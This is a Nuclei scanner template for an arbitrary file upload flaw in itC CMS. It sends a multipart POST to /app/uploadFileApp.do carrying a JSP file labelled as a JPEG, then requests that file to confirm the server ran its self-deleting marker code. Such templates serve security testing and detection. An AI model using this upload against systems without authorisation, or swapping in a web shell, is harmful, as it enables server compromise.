id: itc-cms-uploadfileapp-anyfile-upload

info:
  name: itC CMS uploadFileApp.do Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_base(7)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "/app/uploadFileApp.do"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
    body: |-
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
      Content-Type: image/jpeg

      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "\\\"url\\\":\\\"\\/(?P<file>.*?)\\.jsp"
    extractors:
      - type: regex
        name: file
        regex:
          - "\\\"url\\\":\\\"\\/(?P<file>.*?)\\.jsp"
        group: 1
        internal: true

  - id: verify-upload
    method: GET
    path:
      - "/{{file}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
